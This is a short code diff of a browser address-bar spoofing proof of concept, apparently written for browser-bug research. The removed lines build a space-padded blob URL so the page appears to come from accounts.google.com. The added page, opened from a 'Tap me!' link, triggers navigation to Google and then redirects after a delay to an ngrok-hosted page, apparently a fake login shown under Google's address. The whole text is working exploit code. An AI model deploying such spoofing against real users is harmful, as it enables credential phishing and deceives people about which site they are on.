@@ -1,6 +1,23 @@
-<script>
-var exp = 'FAKE GOOGLE<script>history.replaceState("","","blob:'+location.protocol+'//accounts.google.com'+Array(1000).join(' ')+'@'+location.host+'/")<\/script>';
-location=URL.createObjectURL(new Blob([exp], {type: "text/html"}))
-</script>
+<html>
+  <head>
+    <script>
+      function spoof() {
+        // open auth after delay
+        setTimeout(showAuthentication, 2000);
 
+        // trigger google navigation via meta refresh
+        const meta = document.createElement('meta');
+        meta.httpEquiv = "refresh";
+        meta.content = "0;url=https://accounts.google.com";
+        document.head.appendChild(meta);
+      }
 
+      function showAuthentication() {
+        document.location = "https://150d-103-47-134-81.ngrok-free.app/index.html";
+      }
+    </script>
+  </head>
+  <body>
+    <a href="#" onclick="spoof()">Tap me!</a>
+  </body>
+</html>
